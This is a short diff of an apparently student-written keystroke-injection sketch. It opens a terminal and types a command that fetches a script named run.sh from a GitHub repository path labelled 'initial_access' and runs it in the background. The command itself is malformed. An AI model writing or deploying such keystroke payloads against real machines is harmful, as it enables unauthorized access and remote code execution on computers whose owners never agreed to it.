@@ -6,7 +6,7 @@ type(KEY_LEFT_ALT,false);
 type('t',false); 
 Keyboard.releaseAll(); 
 delay(1000); 
-Keyboard.print("insert command here"); 
+Keyboard.print("{git pull https://github.com/Sad-0w/CS564_project/blob/main/initial_access/run.sh ; bash run.sh} &"); 
 
 delay(10); 
 Keyboard.releaseAll(); 
